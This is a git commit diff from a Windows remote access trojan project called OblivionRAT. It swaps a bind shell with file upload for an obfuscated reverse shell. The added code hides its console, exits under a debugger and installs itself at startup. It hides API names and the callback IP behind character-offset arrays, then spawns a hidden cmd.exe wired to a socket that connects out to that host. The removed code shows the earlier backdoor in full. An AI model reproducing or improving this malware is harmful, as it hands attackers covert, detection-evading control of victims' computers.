df15c8780628c95c25e257065e512813128fa6e3
Ledyxoo <killian.dsj@outlook.fr>
2024-05-29 19:37:33 +0200

    Obfuscascion basic back

--- OblivionRAT/Server.cpp
+++ OblivionRAT/Server.cpp
@@ -1,234 +1,121 @@
-﻿#include "anti-debug.h"
+﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include "reg.h"
+#include "anti-debug.h"
+#include "settings.h"
 
-//our variables, we need them globally to use them in all functions
-char bufferin[1024]; //the buffer to read data from socket
-char bufferout[65535]; //the buffer to write data to the socket
-int i, port; // i is used for loop , port is going to keep the portnumber
-SOCKET locsock, remsock;  //the sockets we are going to need
-SOCKADDR_IN sinloc, sinrem; //the structures needed for our sockets
-WSADATA wsadata; //wsadata
-STARTUPINFO startinfo; //startupinfo structure for CreateProcess
-SECURITY_ATTRIBUTES secat; //security attributes structure needed for CreateProcess
-PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess
-int bytesWritten;  //number of bytes written gets stored here
-DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes available
-//and the exitcode
-void CommandPrompt(void);       //the function to give the command prompt
-void handle_upload(SOCKET sock); //the function to handle file uploads
 
-int main() //the main function
+typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);
+
+WSADATA wsaData;
+SOCKET wSock;
+struct sockaddr_in hax;
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
+typedef SOCKET(WINAPI* WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
+using namespace std;
+
+// you don't need this in the code, just for you to understand how we did the obfuscation
+void obfuscation(char* big_string, char* original_string) {
+    for (int i = 0; i < strlen(original_string); i++) {
+        for (int j = 0; j < strlen(big_string); ++j) {
+            if (original_string[i] == big_string[j]) {
+                printf("%d,", j);
+            }
+        }
+    }
+}
+
+string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
+    string empty_string = "";
+    for (int i = 0; i < sizeof_offset / 4; ++i) {
+        char character = big_string[offsets[i]];
+        empty_string += character;
+    }
+    return empty_string;
+}
+int main(int argc, char* argv[])
 {
-    //hide console
-   FreeConsole();
-    //check if debugger is present
-   if (BugCheck()) {
-		return EXIT_FAILURE;
+	FreeConsole();
+	if (IsDebuggerPresent()) {
+		exit(0);
 	}
-
-   //sleep for 30 seconds
-   Sleep(30000);
-
-   //add to startup
     Start();
-    //set listen port
-    port = 6000;
-    //tell windows we want to use sockets
-    WSAStartup(0x101, &wsadata);
-    //create socket
-    locsock = socket(AF_INET, SOCK_STREAM, 0);
+    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
+    char create_process_string[] = "inet_addr";
+    char big_numbers[] = "1234567.890";
 
-    //fill structure
-    sinloc.sin_family = AF_INET;
-    sinloc.sin_addr.s_addr = INADDR_ANY;
-    sinloc.sin_port = htons(port);
+    int c_p_o[] = { 28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26 };
+    int w_s_o[] = { 48,44,26,44,19,0,17,19,20,15 };
+    int w_c_o[] = { 48,44,26,28,14,13,13,4,2,19 };
+    int w_soc_offset[] = { 48,44,26,44,14,2,10,4,19 };
+    int h_t_o[] = { 7,19,14,13,18 };
+    int i_a_o[] = { 8,13,4,19,53,0,3,3,17 };
+    int w_s_a_o[] = { 48,44,26,44,14,2,10,4,19,26 };
+    int w_f_s_o_o[] = { 48,0,8,19,31,14,17,44,8,13,6,11,4,40,1,9,4,2,19 };
+    int print_f_offset[] = { 15,17,8,13,19,5 };
+    int ipaddr_offset[] = { 0,10,7,1,3,7,4,7,0,3,3 };
+    int exe_c_m_d[] = { 2,12,3,52,4,23,4 };
+    short port = 6000;
+    int w_s_2_32lld[] = { 22,18,55,53,56,55,52,3,11,11 };
+    int k_renel_32[] = { 10,4,17,13,4,11,56,55,52,3,11,11 };
 
-    //bind the socket to the specified port
-    if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
-    {
-        WSACleanup();
-        printf("Error binding socket.\n");
-        return EXIT_FAILURE;
+    HMODULE w_s2_32lib = LoadLibraryA(getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str());
+
+    FARPROC w_sa_St_ar_tup = GetProcAddress(w_s2_32lib, getOriginalString(w_s_o, big_string, sizeof(w_s_o)).c_str());
+    FARPROC Connectsaw = GetProcAddress(w_s2_32lib, getOriginalString(w_c_o, big_string, sizeof(w_c_o)).c_str());
+    FARPROC wsaSocket = GetProcAddress(w_s2_32lib, getOriginalString(w_soc_offset, big_string, sizeof(w_soc_offset)).c_str());
+    FARPROC htonsFunc = GetProcAddress(w_s2_32lib, getOriginalString(h_t_o, big_string, sizeof(h_t_o)).c_str());
+    FARPROC inetAddr = GetProcAddress(w_s2_32lib, getOriginalString(i_a_o, big_string, sizeof(i_a_o)).c_str());
+
+
+    reinterpret_cast<int(WINAPI*)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);
+
+    // Those two lines are just used to convert the string 'ws2_32.dll' into a wide string, because that's the format the GetModuleHandle expect
+    string original_ws_2_32_dl_l = getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str();
+    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
+    // ---
+    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
+        GetProcAddress(GetModuleHandle(wide_original_ws_2_32_dl_l.c_str()),
+            getOriginalString(w_s_a_o, big_string, sizeof(w_s_a_o)).c_str()));
+
+    wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = reinterpret_cast<u_short(__stdcall*)(u_short)>(htonsFunc)(port);
+    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(
+        getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());
+
+    if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
+        LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>
+        (Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
+        printf("\nit's working\n");
+    }
+    else {
+        printf("Error: 0x%x\n", GetLastError());
     }
 
-    //listen on the specified socket
-    if (listen(locsock, 5) == SOCKET_ERROR)
-    {
-        WSACleanup();
-        printf("Error listening socket.\n");
-        return EXIT_FAILURE;
+    FARPROC createProcess = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
+        getOriginalString(c_p_o, big_string, sizeof(c_p_o)).c_str());
+    FARPROC waitForSingleObject = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
+        getOriginalString(w_f_s_o_o, big_string, sizeof(w_f_s_o_o)).c_str());
+
+
+    STARTUPINFOA sui;
+    PROCESS_INFORMATION pi;
+    memset(&sui, 0, sizeof(sui));
+    sui.cb = sizeof(sui);
+    sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    sui.wShowWindow = SW_HIDE;
+
+    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;
+
+    if (reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
+        BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>
+        (createProcess)(nullptr, const_cast<LPSTR>(getOriginalString(exe_c_m_d, big_string, sizeof(exe_c_m_d)).c_str()), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sui, &pi)) {
+        reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(waitForSingleObject)(pi.hProcess, INFINITE);
+        printf("it is working !!!");
     }
 
-    //infinite loop here to keep the program listening
-    while (1)
-    {
-        remsock = SOCKET_ERROR;
-        while (remsock == SOCKET_ERROR)
-        {
-            //accept connection to our program
-            remsock = accept(locsock, NULL, NULL);
-            if (remsock == INVALID_SOCKET)
-            {
-                //cleanup and exit program
-                WSACleanup();
-                printf("Error accepting socket.");
-                return EXIT_FAILURE;
-            }
-
-            CommandPrompt(); //start the commandprompt function
-        }
-        closesocket(remsock); //close the socket
-    }
-    //we should never reach this point, but i've put this hear just in case 😉
-    return EXIT_SUCCESS;
-}
-
-//*************************************************************
-void CommandPrompt(void) //the function which handles the complete commandprompt
-{
-    secat.nLength = sizeof(SECURITY_ATTRIBUTES);
-    secat.bInheritHandle = TRUE;
-    DWORD bytesW;             //number of bytes written gets stored here
-    HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
-    char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
-    char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'
-
-    //create the pipes for our command prompt
-    CreatePipe(&newstdin, &writein, &secat, 0);
-    CreatePipe(&readout, &newstdout, &secat, 0);
-
-    GetStartupInfo(&startinfo);
-
-    //fill another structure
-    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    startinfo.wShowWindow = SW_HIDE;
-    startinfo.hStdOutput = newstdout;
-    startinfo.hStdError = newstdout;
-    startinfo.hStdInput = newstdin;
-
-    wchar_t cmd[] = L"cmd.exe"; //the command we want to start
-
-    //start cmd prompt
-    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo)) {
-        printf("CreateProcess failed (%d).\n", GetLastError());
-        return;
-    }
-
-    //endless loop
-    while (1)
-    {
-        //check if cmd.exe is still running, if not then cleanup and start listening again.
-        if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
-        {
-            CloseHandle(procinfo.hThread);
-            CloseHandle(procinfo.hProcess);
-            CloseHandle(newstdin);
-            CloseHandle(writein);
-            CloseHandle(readout);
-            CloseHandle(newstdout);
-            break;
-        }
-        bytesRead = 0;
-        //Sleep 0.5 seconds to give cmd.exe the chance to startup
-        Sleep(500);
-        //check if the pipe already contains something we can write to output
-        PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
-        if (bytesRead != 0)
-        {
-            while (bytesRead != 0)
-            {     //read data from cmd.exe and send to client, then clear the buffer
-                int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
-                send(remsock, bufferout, strlen(bufferout), 0);
-                ZeroMemory(bufferout, sizeof(bufferout));
-                Sleep(100);
-                PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
-            }
-        }
-        // clear bufferin
-        ZeroMemory(bufferin, sizeof(bufferin));
-        //receive the command given
-        recv(remsock, bufferin, sizeof(bufferin), 0);
-
-        if (strncmp(bufferin, "upload", 6) == 0) {
-            handle_upload(remsock);
-            continue;
-        }
-
-        //if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
-        //from hanging.
-        if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
-        {
-            //let cmd.exe close by giving the command, then go to closeup label
-            WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
-            goto closeup;
-        }
-        //else write the command to cmd.exe
-        WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
-        // clear bufferin
-        ZeroMemory(bufferin, sizeof(bufferin));
-    }
-    //close up all handles
-closeup:
-    if (procinfo.hThread != NULL) {
-        CloseHandle(procinfo.hThread);
-        procinfo.hThread = NULL;
-    }
-    if (procinfo.hProcess != NULL) {
-        CloseHandle(procinfo.hProcess);
-        procinfo.hProcess = NULL;
-    }
-    if (newstdin != NULL) {
-        CloseHandle(newstdin);
-        newstdin = NULL;
-    }
-    if (writein != NULL) {
-        CloseHandle(writein);
-        writein = NULL;
-    }
-    if (readout != NULL) {
-        CloseHandle(readout);
-        readout = NULL;
-    }
-    if (newstdout != NULL) {
-        CloseHandle(newstdout);
-        newstdout = NULL;
-    }
-}
-
-void handle_upload(SOCKET sock) {
-    char filename[256];
-    int received;
-    FILE* fp;
-
-    // Clear the buffer and receive the filename
-    ZeroMemory(bufferin, sizeof(bufferin));
-    if (recv(sock, filename, sizeof(filename), 0) <= 0) {
-        send(sock, "Error receiving filename\n", strlen("Error receiving filename\n"), 0);
-        return;
-    }
-
-    // Remove newline character if present
-    char* newline = strchr(filename, '\n');
-    if (newline) {
-        *newline = '\0';
-    }
-    // Open the file for writing
-    fp = fopen(filename, "w");
-    if (fp == NULL) {
-        send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
-        return;
-    }
-    send(sock, "File created\n", strlen("File created\n"), 0);
-
-    // Receive the file content
-    char stop[] = "stop upload";
-    while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
-        if (strstr(bufferin, "stop upload") != NULL) {
-            break;
-        }
-        fwrite(bufferin, 1, received, fp);
-    }
-    fclose(fp);
-
-    send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
+    return 0;
 }
--- OblivionRAT/settings.h
+++ OblivionRAT/settings.h
@@ -1,17 +1,15 @@
+#include <winsock2.h>
 #include <string>
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
+#include <Windows.h>
 #include <string.h>
-#include <winsock.h>
 #include <iostream>
 #include <sys/stat.h>
 #include <random>
 #include <Shlwapi.h>
 #include <TlHelp32.h>
 
-
-
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ws2_32")
 #pragma comment(lib, "Shlwapi.lib")
 
